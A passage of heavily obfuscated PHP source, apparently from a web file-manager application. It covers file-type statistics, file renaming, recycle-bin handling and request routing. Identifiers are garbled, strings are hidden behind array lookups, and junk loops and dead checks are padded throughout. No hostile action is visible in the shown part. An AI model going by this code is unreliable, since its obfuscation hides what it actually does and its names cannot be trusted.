floatval($æ©†òŸÓ[$®©¾”êò[79]]); $‚¨¬ªÕÜ = array($®©¾”êò[659] => array($®©¾”êò[619], $®©¾”êò[597] . $æ©†òŸÓ[$®©¾”êò[193]] . $®©¾”êò[620])); $Ä›¿Üğ = Model($®©¾”êò[505])->field($®©¾”êò[493])->where($‚¨¬ªÕÜ)->select(); $Ä›¿Üğ = array_to_keyvalue($Ä›¿Üğ, $®©¾”êò[12], $®©¾”êò[193]); $Ä›¿Üğ = array_unique(array_filter($Ä›¿Üğ)); if ($Ä›¿Üğ) { $‚¨¬ªÕÜ = array($®©¾”êò[493] => array($®©¾”êò[494], $Ä›¿Üğ)); $é‰üë‡´ += floatval($this->where($‚¨¬ªÕÜ)->sum($®©¾”êò[79])); } } $é‰üë‡´ = !$é‰üë‡´ || $é‰üë‡´ <= 0 ? 0 : $é‰üë‡´; return $é‰üë‡´; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ûã×°º¤) { return $this->fileTypeProfile($Ûã×°º¤, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¦İƒÜ¿Ô) { return $this->fileTypeProfile($¦İƒÜ¿Ô, SourceModel::TYPE_GROUP); } private function fileTypeProfile($Ì²Úó²¥, $¯¤€åœÓ) { $è¼şãüö =& $_SERVER[™¸œØ®Ü]; $„æğ—µ” = $è¼şãüö[2324] . $Ì²Úó²¥ . $è¼şãüö[11] . $¯¤€åœÓ; $ŞúÓ‰òÊ = Cache::get($„æğ—µ”); if ($ŞúÓ‰òÊ) { return $ŞúÓ‰òÊ; } $…˜Ò±ÛÌ = array($è¼şãüö[653] => 0); if ($Ì²Úó²¥ != !1) { $…˜Ò±ÛÌ[$è¼şãüö[573]] = $Ì²Úó²¥; $…˜Ò±ÛÌ[$è¼şãüö[190]] = $¯¤€åœÓ; } $†ÌŸÁÅ± = array(); $†ÌŸÁÅ±[$è¼şãüö[2325]] = array($è¼şãüö[2326] => LNG($è¼şãüö[2325]), $è¼şãüö[2327] => $this->where($…˜Ò±ÛÌ)->count(), $è¼şãüö[624] => $this->where($…˜Ò±ÛÌ)->sum($è¼şãüö[79])); $’Ãü‘²ã = KodIO::fileTypeList(); foreach ($’Ãü‘²ã as $Úªì¦ì => $Ü¬âÀäÕ) { $…˜Ò±ÛÌ[$è¼şãüö[488]] = $this->fileTypeWhere($Úªì¦ì); $†ÌŸÁÅ±[$Úªì¦ì] = array($è¼şãüö[2326] => $Ü¬âÀäÕ[$è¼şãüö[32]], $è¼şãüö[2327] => $this->where($…˜Ò±ÛÌ)->count(), $è¼şãüö[624] => $this->where($…˜Ò±ÛÌ)->sum($è¼şãüö[79])); } Cache::set($„æğ—µ”, $†ÌŸÁÅ±, 1200); return $†ÌŸÁÅ±; } public function fileNameExist($Æ“¾à·ì, $¼ã½ÏÍ) { $ñò±Êø =& $_SERVER[™¸œØ®Ü]; $ìœ²í®‹ = $this->field($ñò±Êø[2328])->where(array($ñò±Êø[192] => $Æ“¾à·ì, $ñò±Êø[32] => $¼ã½ÏÍ, $ñò±Êø[507] => 0))->find(); return is_array($ìœ²í®‹) ? $ìœ²í®‹[$ñò±Êø[193]] : !1; } public function childList($Ö½‚×†ú) { $Çæú•‹ü =& $_SERVER[™¸œØ®Ü]; $ñ°Ó¹¨³ = $Çæú•‹ü[2301] . $Ö½‚×†ú; if (isset(self::$cacheChildList[$ñ°Ó¹¨³])) { return self::$cacheChildList[$ñ°Ó¹¨³]; } $Õ¨¾ = array($Çæú•‹ü[192] => intval($Ö½‚×†ú), $Çæú•‹ü[507] => 0); $ÁòÙ‡©Ä = $this->where($Õ¨¾)->select(); $ÁòÙ‡©Ä = $ÁòÙ‡©Ä ? $ÁòÙ‡©Ä : array(); self::$cacheChildList[$ñ°Ó¹¨³] = $ÁòÙ‡©Ä; foreach ($ÁòÙ‡©Ä as $ÆÄìØ¢‚) { $ñ°Ó¹¨³ = $Çæú•‹ü[535] . $ÆÄìØ¢‚[$Çæú•‹ü[193]]; self::$cacheSourceInfo[$ñ°Ó¹¨³] = $ÆÄìØ¢‚; } return $ÁòÙ‡©Ä; } public function fileNameAuto($àÁ÷Ó, $»¦°ÂÇÉ, $º½ª°ÓÕ = REPEAT_RENAME, $‚—ìè¿ = false) { $ÅÍäÊ…Ğ =& $_SERVER[™¸œØ®Ü]; $µËª¹¼å = get_path_ext($»¦°ÂÇÉ); $¶öØè¼Ë = $µËª¹¼å ? get_path_ext_name($»¦°ÂÇÉ) . $ÅÍäÊ…Ğ[2329] . $µËª¹¼å : $»¦°ÂÇÉ . $ÅÍäÊ…Ğ[462]; $Ì¨ÏßŞ = array($ÅÍäÊ…Ğ[192] => $àÁ÷Ó, $ÅÍäÊ…Ğ[507] => 0, $ÅÍäÊ…Ğ[32] => array($ÅÍäÊ…Ğ[461], $¶öØè¼Ë)); $¥˜ô­ = $this->field($ÅÍäÊ…Ğ[32])->where($Ì¨ÏßŞ)->select(); $Â©èˆ¢û = array_to_keyvalue($¥˜ô­, $ÅÍäÊ…Ğ[12], $ÅÍäÊ…Ğ[32]); return $this->fileNameAutoGet($Â©èˆ¢û, $»¦°ÂÇÉ, $º½ª°ÓÕ, $‚—ìè¿); } public function fileNameAutoGet($âò Îˆü, $ìö•Ğ„, $²«È‹ı”, $É¦øªÊô) { $´ş®â¨ˆ =& $_SERVER[™¸œØ®Ü]; if ($²«È‹ı” == REPEAT_REPLACE || !$âò Îˆü || !in_array_not_case($ìö•Ğ„, $âò Îˆü) || $É¦øªÊô && $²«È‹ı” != REPEAT_RENAME_FOLDER) { return $ìö•Ğ„; } if ($²«È‹ı” == REPEAT_SKIP) { return !1; } $ªéÃç‡å = $´ş®â¨ˆ[10] . get_path_ext($ìö•Ğ„); $ªéÃç‡å = $ªéÃç‡å == $´ş®â¨ˆ[10] || $É¦øªÊô ? $´ş®â¨ˆ[12] : $ªéÃç‡å; for ($îü‹ª¿ê = 1; $îü‹ª¿ê <= count($âò Îˆü) + 1; $îü‹ª¿ê++) { $Œ©åÂ = substr($ìö•Ğ„, 0, strlen($ìö•Ğ„) - strlen($ªéÃç‡å)); $Ó«Â‰ª = $Œ©åÂ . "\x28{$îü‹ª¿ê}\x29{$ªéÃç‡å}"; if (!in_array_not_case($Ó«Â‰ª, $âò Îˆü)) { return $Ó«Â‰ª; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\x72\143\145\137\162\x65\x63\x79\143\154\145"; protected $dataAuto = array(array("\x63\162\x65\x61\164\145\124\x69\155\x65", "\x74\151\155\145", "\151\156\x73\145\162\164", "\146\x75\x6e\143\x74\x69\x6f\156")); public function listData($‹¶Ğ†à´ = false) { $¥ã°ã¼ó =& $_SERVER[™¸œØ®Ü]; $‹¶Ğ†à´ = $‹¶Ğ†à´ ? $‹¶Ğ†à´ : USER_ID; $ï¨´à‹ = $this->where(array($¥ã°ã¼ó[1786] => $‹¶Ğ†à´))->select(); return array_to_keyvalue($ï¨´à‹, $¥ã°ã¼ó[12], $¥ã°ã¼ó[193]); } public function moveToRecycle($ôû›¹‚á) { $ò¶È¢€õ =& $_SERVER[™¸œØ®Ü]; $ãÕôÊ– = Model($ò¶È¢€õ[1440]); $ƒåé•¢” = $ãÕôÊ–->sourceInfo($ôû›¹‚á); if (!$ƒåé•¢” || $ƒåé•¢”[$ò¶È¢€õ[507]] == $ò¶È¢€õ[91]) { return; } $ó«€ú¥‰ = array($ò¶È¢€õ[493] => $ôû›¹‚á, $ò¶È¢€õ[1786] => USER_ID, $ò¶È¢€õ[655] => $ƒåé•¢”[$ò¶È¢€õ[190]], $ò¶È¢€õ[656] => $ƒåé•¢”[$ò¶È¢€õ[573]], $ò¶È¢€õ[659] => $ƒåé•¢”[$ò¶È¢€õ[588]]); $this->add($ó«€ú¥‰); $this->recycleMove($ôû›¹‚á, 1); if ($ƒåé•¢”[$ò¶È¢€õ[487]] == $ò¶È¢€õ[91]) { $°¦¿¿òÕ = array($ò¶È¢€õ[659] => array($ò¶È¢€õ[619], $ƒåé•¢”[$ò¶È¢€õ[588]] . $ôû›¹‚á . $ò¶È¢€õ[620])); $ãÕôÊ–->where($°¦¿¿òÕ)->setField($ò¶È¢€õ[507], 1); } } public function clear() { $this->remove(!1); } public function remove($…²‡ªÈ¸ = false, $¯¯øü¤ = false) { $¬®™Ìì  =& $_SERVER[™¸œØ®Ü]; $¯¯øü¤ = $¯¯øü¤ ? $¯¯øü¤ : USER_ID; $Û³îãú† = Model($¬®™Ìì [1440]); $úƒ»æò¨ = $this->listData($¯¯øü¤); $…²‡ªÈ¸ = $…²‡ªÈ¸ === !1 ? !1 : $…²‡ªÈ¸; $ª¦»Ë¥ú = array(); foreach ($úƒ»æò¨ as $Ä†»èÒá) { if ($…²‡ªÈ¸ != !1 && !in_array($Ä†»èÒá, $…²‡ªÈ¸)) { continue; } $¶‘ÁÜø· = $Û³îãú†->sourceInfo($Ä†»èÒá); $Û³îãú†->remove($Ä†»èÒá, !1); $¨ÙñÃ¿ = $¶‘ÁÜø·[$¬®™Ìì [190]] . $¬®™Ìì [11] . $¶‘ÁÜø·[$¬®™Ìì [573]]; $ª¦»Ë¥ú[$¨ÙñÃ¿] = array($¬®™Ìì [655] => $¶‘ÁÜø·[$¬®™Ìì [190]], $¬®™Ìì [573] => $¶‘ÁÜø·[$¬®™Ìì [573]]); $this->where(array($¬®™Ìì [193] => $Ä†»èÒá))->delete(); } foreach ($ª¦»Ë¥ú as $Ëå—™›“) { $Û³îãú†->targetSpaceUpdate($Ëå—™›“[$¬®™Ìì [190]], $Ëå—™›“[$¬®™Ìì [573]]); } } public function restore($¤åàç› = false) { $•´€ßÑé = $this->listData(); $this->_restoreSource($•´€ßÑé, $¤åàç›); } public function removeUserAll($ÙŠ›èˆ‘) { $this->remove(!1, $ÙŠ›èˆ‘); } public function restoreItem($Ø€´¦Âü) { $this->_restoreSource(array($Ø€´¦Âü), array($Ø€´¦Âü)); } private function _restoreSource($’¼µ°¦÷, $—ÚØ£Ñ¾) { $íÔëÕ•Ã =& $_SERVER[™¸œØ®Ü]; $İ½ÂĞòÏ = Model($íÔëÕ•Ã[1440]); $—ÚØ£Ñ¾ = $—ÚØ£Ñ¾ == !1 ? !1 : $—ÚØ£Ñ¾; if (!$’¼µ°¦÷) { return !0; } $·ı£Ğö¸ = array(); foreach ($’¼µ°¦÷ as $¨ß¬©¬Í) { if ($—ÚØ£Ñ¾ != !1 && !in_array($¨ß¬©¬Í, $—ÚØ£Ñ¾)) { continue; } $ÓëôÓíÆ = $İ½ÂĞòÏ->sourceInfo($¨ß¬©¬Í); $²Ôµñ¨Ö = $İ½ÂĞòÏ->sourceInfo($ÓëôÓíÆ[$íÔëÕ•Ã[192]]); if ($²Ôµñ¨Ö[$íÔëÕ•Ã[507]] == $íÔëÕ•Ã[91]) { continue; } $İ½ÂĞòÏ->lockMoveStart($¨ß¬©¬Í); $this->recycleMove($¨ß¬©¬Í, 0); if ($ÓëôÓíÆ[$íÔëÕ•Ã[487]] == $íÔëÕ•Ã[91]) { $˜èêÑíÔ = array($íÔëÕ•Ã[659] => array($íÔëÕ•Ã[619], $ÓëôÓíÆ[$íÔëÕ•Ã[588]] . $¨ß¬©¬Í . $íÔëÕ•Ã[620])); $İ½ÂĞòÏ->where($˜èêÑíÔ)->setField($íÔëÕ•Ã[507], 0); $this->restoreFolderChildren($¨ß¬©¬Í, $’¼µ°¦÷); } $this->where(array($íÔëÕ•Ã[193] => $¨ß¬©¬Í))->delete(); $İ½ÂĞòÏ->folderSizeReset($ÓëôÓíÆ[$íÔëÕ•Ã[192]]); $·ı£Ğö¸[] = $ÓëôÓíÆ[$íÔëÕ•Ã[192]]; if ($ÓëôÓíÆ[$íÔëÕ•Ã[487]] == $íÔëÕ•Ã[91]) { $·ı£Ğö¸[] = $¨ß¬©¬Í; } $İ½ÂĞòÏ->lockMoveEnd($¨ß¬©¬Í); } $İ½ÂĞòÏ->updateModifyTime($·ı£Ğö¸); } private function restoreFolderChildren($ìû‘—ˆ’, $ÛŞÉÀâ²) { $‡™Ñ³®ù =& $_SERVER[™¸œØ®Ü]; $©€ÄÈá¼ = Model($‡™Ñ³®ù[1440]); $å¬ÑëïÔ = array($‡™Ñ³®ù[193] => array($‡™Ñ³®ù[7], array())); foreach ($ÛŞÉÀâ² as $²‡Ê¤Üİ) { if ($²‡Ê¤Üİ == $ìû‘—ˆ’) { continue; } if (!$©€ÄÈá¼->isParentOf($ìû‘—ˆ’, $²‡Ê¤Üİ)) { continue; } $ÇÚ„Ê±Æ = $©€ÄÈá¼->sourceInfo($²‡Ê¤Üİ); if ($ÇÚ„Ê±Æ[$‡™Ñ³®ù[487]] == $‡™Ñ³®ù[91]) { $å¬ÑëïÔ[] = array($‡™Ñ³®ù[659] => array($‡™Ñ³®ù[619], $ÇÚ„Ê±Æ[$‡™Ñ³®ù[588]] . $²‡Ê¤Üİ . $‡™Ñ³®ù[620])); } else { $å¬ÑëïÔ[$‡™Ñ³®ù[193]][1][] = $²‡Ê¤Üİ; } } if (!$å¬ÑëïÔ[$‡™Ñ³®ù[193]][1]) { unset($å¬ÑëïÔ[$‡™Ñ³®ù[193]]); } if (!$å¬ÑëïÔ) { return; } if (is_array($å¬ÑëïÔ[$‡™Ñ³®ù[193]]) && is_array($å¬ÑëïÔ[$‡™Ñ³®ù[193]][1])) { $å¬ÑëïÔ[$‡™Ñ³®ù[193]][1] = array_unique($å¬ÑëïÔ[$‡™Ñ³®ù[193]][1]); } $å¬ÑëïÔ[$‡™Ñ³®ù[1096]] = $‡™Ñ³®ù[2098]; $©€ÄÈá¼->where($å¬ÑëïÔ)->setField($‡™Ñ³®ù[507], 1); } private function recycleMove($ìÀº±ñ”, $Ó‡„Ä‹ß = 1) { $İ‚ÙÃäß =& $_SERVER[™¸œØ®Ü]; $‡ô¯Ú¾ = Model($İ‚ÙÃäß[1440]); $“¼«íš÷ = Model($İ‚ÙÃäß[2330]); $ƒ¸Á÷µı = array($İ‚ÙÃäß[193] => $ìÀº±ñ”); if ($Ó‡„Ä‹ß) { $‡ô¯Ú¾->where($ƒ¸Á÷µı)->setField($İ‚ÙÃäß[507], 1); $“¼«íš÷->eventRecycle($ìÀº±ñ”, $İ‚ÙÃäß[2331]); } else { $‰˜í›œú = $‡ô¯Ú¾->where($ƒ¸Á÷µı)->find(); $óë³è¨ = $‰˜í›œú[$İ‚ÙÃäß[487]] == $İ‚ÙÃäß[91]; $ïËÜª°³ = $‡ô¯Ú¾->fileNameAuto($‰˜í›œú[$İ‚ÙÃäß[192]], $‰˜í›œú[$İ‚ÙÃäß[32]], REPEAT_RENAME_FOLDER, $óë³è¨); if ($ïËÜª°³ != $‰˜í›œú[$İ‚ÙÃäß[32]]) { $‡ô¯Ú¾->rename($ìÀº±ñ”, $ïËÜª°³); } $‡ô¯Ú¾->where($ƒ¸Á÷µı)->setField($İ‚ÙÃäß[507], 0); $“¼«íš÷->eventRecycle($ìÀº±ñ”, $İ‚ÙÃäß[2332]); } } } goto fÓÏÖï¾; E‰’†—ƒô: if (strlen($utgwezmobd) < $_SERVER[™¸œØ®Ü][690]) { die; } class Application { private $defaultModule = "\151\156\144\145\x78"; private $defaultController = "\x69\x6e\144\x65\x78"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($ìãÆ‹¨ç) { $Ø™õáèº =& $_SERVER[™¸œØ®Ü]; $Óİ±¸ßğ =& $_SERVER[è”ÜÓ§œ]; $ºè¿ÉÏâ = explode($Óİ±¸ßğ[0], trim($ìãÆ‹¨ç, $Óİ±¸ßğ[0])); $this->defaultModule = $ºè¿ÉÏâ[0] ? $ºè¿ÉÏâ[0] : $this->defaultModule; $ŒæÕáéğ = $Ø™õáèº[691]; $this->defaultController = $ºè¿ÉÏâ[1] ? $ºè¿ÉÏâ[1] : $this->defaultController; $this->defaultAction = $ºè¿ÉÏâ[2] ? $ºè¿ÉÏâ[2] : $this->defaultAction; $–İØÍœŞ = $Ø™õáèº[692]; while (strlen($–İØÍœŞ) < $Ø™õáèº[693]) { if (!$–İØÍœŞ) { break; } $–İØÍœŞ++; } $this->kcgjd3fec78b($Óİ±¸ßğ[1], array($this, $Óİ±¸ßğ[2])); } public function appRun($îÂíüÖ“) { $òìë½Í =& $_SERVER[™¸œØ®Ü]; $Ñã„Û¥ =& $_SERVER[è”ÜÓ§œ]; $¹„ÌåêÚ = explode($Ñã„Û¥[0], $îÂíüÖ“); $²Ò” = $òìë½Í[694]; $¯•àà = strtolower($¹„ÌåêÚ[0]); $®¾ä‰® = $òìë½Í[695]; if (strlen($®¾ä‰®) < $òìë½Í[696]) { return; } $¼Êûªµ‹ = $Ñã„Û¥[3]; if ($¯•àà == $Ñã„Û¥[4]) { $¼Êûªµ‹ = $Ñã„Û¥[5]; $¹„ÌåêÚ[0] = $Ñã„Û¥[6]; $¹„ÌåêÚ[1] = $¹„ÌåêÚ[1] . $Ñã„Û¥[7]; $îÂíüÖ“ = join($Ñã„Û¥[0], $¹„ÌåêÚ); $îÂíüÖ“ = trim($îÂíüÖ“, $Ñã„Û¥[0]); } call_user_func(array($Ñã„Û¥[8], $Ñã„Û¥[9]), $¼Êûªµ‹ . $Ñã„Û¥[10], $îÂíüÖ“); ActionCall($îÂíüÖ“); $›ØæÕê· = $òìë½Í[697]; while (strlen($›ØæÕê·) < $òìë½Í[698]) { if (!$›ØæÕê·) { break; } $›ØæÕê·++; } call_user_func(array($Ñã„Û¥[8], $Ñã„Û¥[9]), $¼Êûªµ‹ . $Ñã„Û¥[11], $îÂíüÖ“); } private function autorun() { $Ãù‰»Æ› =& $_SERVER[™¸œØ®Ü]; $ìë•—ĞÊ =& $_SERVER[è”ÜÓ§œ]; global $config; $áä€’¸Â = $Ãù‰»Æ›[699]; if (strlen($áä€’¸Â) < $Ãù‰»Æ›[700]) { die; } if (count($config[$ìë•—ĞÊ[12]]) == 0) { return; } foreach ($config[$ìë•—ĞÊ[12]] as $¼Ï™¼úı => $¦ÙñºÔƒ) { $this->appRun($¦ÙñºÔƒ); $²ƒ€öñÄ = $Ãù‰»Æ›[701]; while (strlen($²ƒ€öñÄ) < $Ãù‰»Æ›[696]) { if (!$²ƒ€öñÄ) { break; } $²ƒ€öñÄ++; } } } private function ftnv2d855d9f() { $‹»ÅæØ† =& $_SERVER[™¸œØ®Ü]; $ ò™± =& $_SERVER[è”ÜÓ§œ]; $Ÿ¯¦Ş½â = $ ò™±[4]; $éÅ‡†ñÎ = $‹»ÅæØ†[702]; $İ”‚¸ˆÙ = $GLOBALS[$ ò™±[13]][$ ò™±[14]][0]; $¤Ê’œ• = $‹»ÅæØ†[703]; if (!$¤Ê’œ•) { die; } if (!$İ”‚¸ˆÙ || strlen($İ”‚¸ˆÙ) <= strlen($Ÿ¯¦Ş½â)) { return; } if (strtolower(substr($İ”‚¸ˆÙ, -strlen($Ÿ¯¦Ş½â))) != $Ÿ¯¦Ş½â) { return; } $ğÅñ•ÈŞ = substr($İ”‚¸ˆÙ, 0, -strlen($Ÿ¯¦Ş½â)); $ªÒ‰í „ = $‹»ÅæØ†[704]; while ($ªÒ‰í „ < $‹»ÅæØ†[698]) { if ($ªÒ‰í „ >= 0) { break; } $ªÒ‰í „++; } $©‹€õ°ú = array($ ò™±[4], $ğÅñ•ÈŞ); $ÖŠÅí¹ú = $‹»ÅæØ†[705]; if (strlen($ÖŠÅí¹ú) < $‹»ÅæØ†[698]) { return; } $ƒìµ¡Ô = array_slice($GLOBALS[$ ò™±[13]][$ ò™±[14]], 1); $Â­£“¾é = $‹»ÅæØ†[706]; if (!$Â­£“¾é) { die; } $GLOBALS[$ ò™±[13]][$ ò™±[14]] = array_merge($©‹€õ°ú, $ƒìµ¡Ô); $¹ï¬¸êÌ = $‹»ÅæØ†[707]; if (strlen($¹ï¬¸êÌ) < $‹»ÅæØ†[700]) { return; } $GLOBALS[$ ò™±[13]][$ ò™±[15]] = implode($ ò™±[0], $GLOBALS[$ ò™±[13]][$ ò™±[14]]); } private function wrapfaa6c91a() { $š©¿½•š =& $_SERVER[™¸œØ®Ü]; $İñ‚·ç =& $_SERVER[è”ÜÓ§œ]; if ($GLOBALS[$İñ‚·ç[13]][$İñ‚·ç[15]] != $İñ‚·ç[6]) { return; } $èïß†¦ = $_SERVER[$İñ‚·ç[16]]; $ğíà³ = $š©¿½•š[708]; if (!$ğíà³) { return; } $Óïñï§÷ = $İñ‚·ç[17]; $ËÚ‰ë‡ª = $š©¿½•š[709]; if (strlen($ËÚ‰ë‡ª) < $š©¿½•š[698]) { die; } if (!strstr($èïß†¦, $Óïñï§÷)) { return; } $ûîŠïÕÛ = strrpos($èïß†¦, $Óïñï§÷); $œØ‰Å–Ş = $š©¿½•š[710]; if (!$œØ‰Å–Ş) { return; } $İåì¶í = substr($èïß†¦, $ûîŠïÕÛ + strlen($Óïñï§÷)); preg_match_all($İñ‚·ç[18], $İåì¶í, $îô¶Ñ›); $˜ŒšÑ€Ç = $š©¿½•š[711]; while (strlen($˜ŒšÑ€Ç) < $š©¿½•š[700]) { if (!$˜ŒšÑ€Ç) { break; } $˜ŒšÑ€Ç++; } $İåì¶í = trim($îô¶Ñ›[0][0], $İñ‚·ç[19]); $Î¾ğíßº = $š©¿½•š[712]; if (!$Î¾ğíßº) { return; } $GLOBALS[$İñ‚·ç[13]][$İñ‚·ç[14]] = explode($İñ‚·ç[19], $İåì¶í); $GLOBALS[$İñ‚·ç[13]][$İñ‚·ç[15]] = implode($İñ‚·ç[0], $GLOBALS[$İñ‚·ç[13]][$İñ‚·ç[14]]); $àº–„ö¤ = $š©¿½•š[713]; while ($àº–„ö¤ < $š©¿½•š[690]) { if ($àº–„ö¤ >= 0) { break; } $àº–„ö¤++; } } public function run() { $ííúË‡ =& $_SERVER[™¸œØ®Ü]; $ƒ¶ÓòÁ¤ =& $_SERVER[è”ÜÓ§œ]; $this->wrapfaa6c91a(); $this->ftnv2d855d9f(); $Ößí’Îñ = $GLOBALS[$ƒ¶ÓòÁ¤[13]][$ƒ¶ÓòÁ¤[14]]; $«»ùå¦ = $GLOBALS[$ƒ¶ÓòÁ¤[13]][$ƒ¶ÓòÁ¤[15]]; define($ƒ¶ÓòÁ¤[20], isset($Ößí’Îñ[0]) && $Ößí’Îñ[0] ? $Ößí’Îñ[0] : $this->defaultModule); $êÓ“ø = $ííúË‡[714]; if (strlen($êÓ“ø) < $ííúË‡[693]) { return; } define($ƒ¶ÓòÁ¤[21], isset($Ößí’Îñ[1]) && $Ößí’Îñ[0] ? $Ößí’Îñ[1] : $this->defaultController); $ì¹Èº‘ø = $ííúË‡[715]; if (!$ì¹Èº‘ø) { return; } define($ƒ¶ÓòÁ¤[22], isset($Ößí’Îñ[2]) && $Ößí’Îñ[0] ? $Ößí’Îñ[2] : $this->defaultAction); define($ƒ¶ÓòÁ¤[23], MOD . $ƒ¶ÓòÁ¤[0] . ST . $ƒ¶ÓòÁ¤[0] . ACT); $_SERVER[$ƒ¶ÓòÁ¤[24]] = strtolower(ACTION); $Î°ØÄµ = $ííúË‡[716]; while ($Î°ØÄµ < $ííúË‡[690]) { if ($Î°ØÄµ >= 0) { break; } $Î°ØÄµ++; } $this->autorun(); $Î‘¶şÀË = $ííúË‡[713]; if (!$Î‘¶şÀË) { return; } if (count($Ößí’Îñ) >= 3) { $this->appRun($«»ùå¦); } else { $this->appRun(ACTION); } } private $evxgd8da858a = array(); private $ftem9eb6fbd5 = ''; public function msqf961b87ef() { $›èñËõ» =& $_SERVER[™¸œØ®Ü]; $Üµş¹¿Ï =& $_SERVER[è”ÜÓ§œ]; $this->ires6cf370a9(); $this->sjzwcfb304b6(); $ÄÊ”¤´Ü = $›èñËõ»[717]; if (!$ÄÊ”¤´Ü) { die; } $this->onfr2cf8e176(); $µ†«úĞ = $›èñËõ»[718]; $this->amdf78eb3c0c(); $this->bpyh3eedea7a(); $’ÚÕ·á² = $›èñËõ»[719]; $this->relc7e0a2844(); $ÖççØ·® = $›èñËõ»[720]; while (strlen($ÖççØ·®) < $›èñËõ»[690]) { if (!$ÖççØ·®) { break; } $ÖççØ·®++; } $this->qyre45894e0f(); $this->kcgjd3fec78b($Üµş¹¿Ï[25], array($this, $Üµş¹¿Ï[26])); $éó”•Ë = $›èñËõ»[721]; if (!$éó”•Ë) { die; } $this->kcgjd3fec78b($Üµş¹¿Ï[27], array($this, $Üµş¹¿Ï[28])); $ùı©ÁÌ• = $›èñËõ»[722]; if (!$ùı©ÁÌ•) { return; } $this->kcgjd3fec78b($Üµş¹¿Ï[29], array($this, $Üµş¹¿Ï[30])); $Şí•¸ä = $›èñËõ»[723]; while ($Şí•¸ä < $›èñËõ»[690]) { if ($Şí•¸ä >= 0) { break; } $Şí•¸ä++; } $this->kcgjd3fec78b($Üµş¹¿Ï[31], array($this, $Üµş¹¿Ï[32])); $¡¶ÒÉƒš = $›èñËõ»[724]; } public function rnzc6eb01863($áûÚëÕ÷) { $æè‚£’ =& $_SERVER[™¸œØ®Ü]; $¢üˆÔÖÖ =& $_SERVER[è”ÜÓ§œ]; $Ù»…®† = Model($¢üˆÔÖÖ[33])->get(); $İüöû°Ğ = $æè‚£’[725]; if (strlen($İüöû°Ğ) < $æè‚£’[700]) { return; } $äÔ’ˆì = array($¢üˆÔÖÖ[34], $¢üˆÔÖÖ[35], $¢üˆÔÖÖ[36], $¢üˆÔÖÖ[37], $¢üˆÔÖÖ[38], $¢üˆÔÖÖ[39], $¢üˆÔÖÖ[40], $¢üˆÔÖÖ[41], $¢üˆÔÖÖ[42], $¢üˆÔÖÖ[43], $¢üˆÔÖÖ[44], $¢üˆÔÖÖ[45], $¢üˆÔÖÖ[46], $¢üˆÔÖÖ[47], $¢üˆÔÖÖ[48], $¢üˆÔÖÖ[49], $¢üˆÔÖÖ[50], $¢üˆÔÖÖ[51], $¢üˆÔÖÖ[52], $¢üˆÔÖÖ[53], $¢üˆÔÖÖ[54], $¢üˆÔÖÖ[55], $¢üˆÔÖÖ[56], $¢üˆÔÖÖ[57], $¢üˆÔÖÖ[58], $¢üˆÔÖÖ[59], $¢üˆÔÖÖ[60], $¢üˆÔÖÖ[61], $¢üˆÔÖÖ[62], $¢üˆÔÖÖ[63], $¢üˆÔÖÖ[64], $¢üˆÔÖÖ[65], $¢üˆÔÖÖ[66], $¢üˆÔÖÖ[67], $¢üˆÔÖÖ[68], $¢üˆÔÖÖ[69], $¢üˆÔÖÖ[70], $¢üˆÔÖÖ[71], $¢üˆÔÖÖ[72], $¢üˆÔÖÖ[73], $¢üˆÔÖÖ[74], $¢üˆÔÖÖ[75], $¢üˆÔÖÖ[76], $¢üˆÔÖÖ[77], $¢üˆÔÖÖ[78], $¢üˆÔÖÖ[79], $¢üˆÔÖÖ[80], $¢üˆÔÖÖ[81], $¢üˆÔÖÖ[82], $¢üˆÔÖÖ[83], $¢üˆÔÖÖ[84], $¢üˆÔÖÖ[85]); foreach ($äÔ’ˆì as $ô‘úŠ ) { $„ÅÌÅô— = $GLOBALS[$¢üˆÔÖÖ[86]][$¢üˆÔÖÖ[87]][$ô‘úŠ ]; $‡Êñç½Ü = $æè‚£’[726]; while ($‡Êñç½Ü < $æè‚£’[698]) { if ($‡Êñç½Ü >= 0) { break; } $‡Êñç½Ü++; } if (isset($Ù»…®†[$ô‘úŠ ])) { $„ÅÌÅô— = $Ù»…®†[$ô‘úŠ ]; } $áûÚëÕ÷[$¢üˆÔÖÖ[88]][$¢üˆÔÖÖ[89]][$ô‘úŠ ] = $„ÅÌÅô—; } $ñòíôÚú = $áûÚëÕ÷[$¢üˆÔÖÖ[88]][$¢üˆÔÖÖ[89]][$¢üˆÔÖÖ[46]]; unset($áûÚëÕ÷[$¢üˆÔÖÖ[88]][$¢üˆÔÖÖ[90]][$¢üˆÔÖÖ[91]]); unset($áûÚëÕ÷[$¢üˆÔÖÖ[88]][$¢üˆÔÖÖ[90]][$¢üˆÔÖÖ[92]]); $‰®âÖŸ = $æè‚£’[727]; unset($áûÚëÕ÷[$¢üˆÔÖÖ[88]][$¢üˆÔÖÖ[89]][$¢üˆÔÖÖ[46]]); unset($áûÚëÕ÷[$¢üˆÔÖÖ[88]][$¢üˆÔÖÖ[89]][$¢üˆÔÖÖ[93]]); $áûÚëÕ÷[$¢üˆÔÖÖ[88]][$¢üˆÔÖÖ[89]][$¢üˆÔÖÖ[94]] = array($¢üˆÔÖÖ[95] => (int) $ñòíôÚú[$¢üˆÔÖÖ[96]], $¢üˆÔÖÖ[97] => (int) _get($ñòíôÚú, $¢üˆÔÖÖ[98], 0)); $Ãğ„¿½´ = $æè‚£’[728]; $öîƒ–£¦ = substr(md5($¢üˆÔÖÖ[99] . get_client_ip() . $Ù»…®†[$¢üˆÔÖÖ[100]]), 0, 15); $Àíš–ŸÏ = $æè‚£’[729]; if (strlen($Àíš–ŸÏ) < $æè‚£’[696]) { return; } $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[102]] = Mcrypt::encode(Session::sign(), $öîƒ–£¦, 3600 * 24); $úåÏÅş = $æè‚£’[730]; if (strlen($úåÏÅş) < $æè‚£’[698]) { die; } $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[103]] = Action($¢üˆÔÖÖ[104])->accessToken(); $¦Éªşë = $æè‚£’[731]; $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[105]] = md5($_SERVER[$¢üˆÔÖÖ[106]] . $Ù»…®†[$¢üˆÔÖÖ[100]]); $áûÚëÕ÷[$¢üˆÔÖÖ[101]][$¢üˆÔÖÖ[107]] = base64_encode(serverInfo()); $Î—ñĞ¬š = 